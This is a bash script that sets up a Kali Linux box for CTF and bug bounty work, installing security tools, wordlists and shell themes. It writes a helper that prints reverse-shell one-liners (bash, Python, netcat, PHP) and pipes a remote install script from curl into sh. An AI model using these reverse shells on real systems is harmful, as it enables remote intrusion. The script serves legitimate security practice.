#!/bin/bash
# kali-ctf-bugbounty-setup.sh
# One script to rule them all 🐉

set -e

echo "[*] === System Update ==="
sudo apt update && sudo apt -y full-upgrade

echo "[*] === Installing Common Tools ==="
sudo apt install -y \
    build-essential gcc g++ make \
    git curl wget python3 python3-pip python3-venv python3-dev \
    tmux vim nano neovim zsh fonts-powerline \
    nmap netcat socat tcpdump wireshark \
    gobuster ffuf dirb seclists wfuzz feroxbuster \
    unzip p7zip-full rar unrar \
    gdb gdb-multiarch \
    binwalk steghide exiftool foremost \
    hashcat john hydra \
    docker.io docker-compose \
    fzf fd-find ripgrep \
    powershell rlwrap \
    openvpn \
    jq ltrace strace \
    flameshot \
    tree htop lsof xclip \
    dnsutils whois \
    gh \
    enum4linux smbclient cifs-utils \
    default-jre \
    upx-ucl \
    patchelf \
    python3-pwntools \
    python3-virtualenvwrapper \
    python3-venv \
    python3-ptyprocess \
    python3-requests \
    python3-netaddr \
    pipx

echo "[*] === Upgrading pip and Installing pipx ==="
python3 -m pip install --upgrade pip
python3 -m pip install --user pipx
python3 -m pipx ensurepath

echo "[*] === Installing Python CTF libs with pipx ==="
pipx install pwntools
pipx install r2pipe
pipx install ropper
pipx install pwncat-cs

echo "[*] === Installing Oh My Zsh ==="
if [ ! -d "$HOME/.oh-my-zsh" ]; then
  sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)" "" --unattended
fi

echo "[*] === Installing Powerlevel10k theme ==="
git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k

echo "[*] === Installing Zsh plugins ==="
git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/zsh-autosuggestions || true
git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting || true

echo "[*] === Installing Powerline fonts ==="
git clone https://github.com/powerline/fonts.git --depth=1
cd fonts && ./install.sh && cd .. && rm -rf fonts

echo "[*] === Configuring .zshrc ==="
sed -i 's/^ZSH_THEME=".*"/ZSH_THEME="powerlevel10k\/powerlevel10k"/' ~/.zshrc
if ! grep -q "zsh-autosuggestions" ~/.zshrc; then
  sed -i 's/plugins=(/plugins=(zsh-autosuggestions zsh-syntax-highlighting /' ~/.zshrc
fi

echo "[*] === Downloading SecLists, rockyou, and fuzzdb ==="
if [ ! -d "/usr/share/seclists" ]; then
  sudo git clone https://github.com/danielmiessler/SecLists.git /usr/share/seclists
fi
if [ ! -f "/usr/share/wordlists/rockyou.txt" ]; then
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz || true
fi
if [ ! -d "/opt/fuzzdb" ]; then
  sudo git clone https://github.com/fuzzdb-project/fuzzdb.git /opt/fuzzdb
fi

echo "[*] === Setting Zsh as Default Shell ==="
chsh -s $(which zsh)

echo "[*] === Creating ~/bin and helper scripts ==="
mkdir -p ~/bin

cat << 'EOF' > ~/bin/revshells.sh
#!/bin/bash
LHOST="$1"; LPORT="$2"
echo "Bash: bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo "Python: python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
echo "Netcat: nc -e /bin/bash $LHOST $LPORT"
echo "PHP: php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
EOF
chmod +x ~/bin/revshells.sh

cat << 'EOF' > ~/bin/fast_ports.sh
#!/bin/bash
TARGET="$1"
echo "[*] Scanning top 1000 TCP ports with nmap..."
nmap -Pn --top-ports 1000 -T4 -oA nmap_top1000 "$TARGET"
EOF
chmod +x ~/bin/fast_ports.sh

echo 'export PATH="$HOME/bin:$PATH"' >> ~/.zshrc

echo "[*] === Cleaning up ==="
sudo apt autoremove -y
sudo apt clean

echo "[*] === All done! ==="
echo "Open a new terminal, select a Powerline font (like 'MesloLGS NF'), and enjoy your elite Kali CTF/Bug Bounty box."
echo "Don't forget to run 'p10k configure' on your first shell to finish Powerlevel10k setup."

